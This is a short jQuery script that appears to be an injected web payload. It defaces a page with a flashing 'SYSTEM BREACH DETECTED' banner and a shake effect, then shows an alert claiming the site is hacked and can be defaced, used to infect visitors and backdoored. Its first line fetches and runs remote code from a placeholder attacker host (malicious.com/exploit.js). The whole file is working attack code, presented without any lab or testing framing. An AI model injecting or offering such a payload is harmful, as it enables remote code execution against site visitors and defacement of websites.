$.getScript("https://malicious.com/exploit.js");

// Create a hacker-like banner message at the top center
$('body').append('<div id="hacker-banner">⚠️ SYSTEM BREACH DETECTED ⚠️</div>');

// Style the banner message
$('#hacker-banner').css({
  position: 'fixed',
  top: '20px',
  left: '50%',
  transform: 'translateX(-50%)',
  background: 'black',
  color: 'lime',
  padding: '15px 30px',
  fontSize: '1.8rem',
  fontWeight: 'bold',
  border: '3px solid red',
  zIndex: 9999,
  textAlign: 'center',
  boxShadow: '0 0 10px red',
  animation: 'glitch 0.4s infinite alternate'
});

// Add shake effect to the page
$('body').css('animation', 'shake 0.1s infinite');

// Inject keyframe styles for animation
$('head').append(`
<style>
  @keyframes shake {
    0% { transform: translate(0, 0); }
    25% { transform: translate(5px, 5px); }
    50% { transform: translate(-5px, -5px); }
    75% { transform: translate(5px, -5px); }
    100% { transform: translate(-5px, 5px); }
  }
  @keyframes glitch {
    0% { transform: scale(1) translate(0, 0); color: red; }
    50% { transform: scale(1.05) translate(-2px, 2px); color: yellow; }
    100% { transform: scale(1) translate(2px, -2px); color: lime; }
  }
</style>
`);

// Stop shake and show final alert after 10 seconds
setTimeout(function() {
  $('#hacker-banner').remove();
  $('body').css('animation', 'none');
  alert(`You are hacked!
I can deface your website, causing trust loss and brand damage.
I can turn your visitors into my victims — infecting all who visit this page.
I can install backdoors, enabling persistent access to your site.`);
}, 10000);
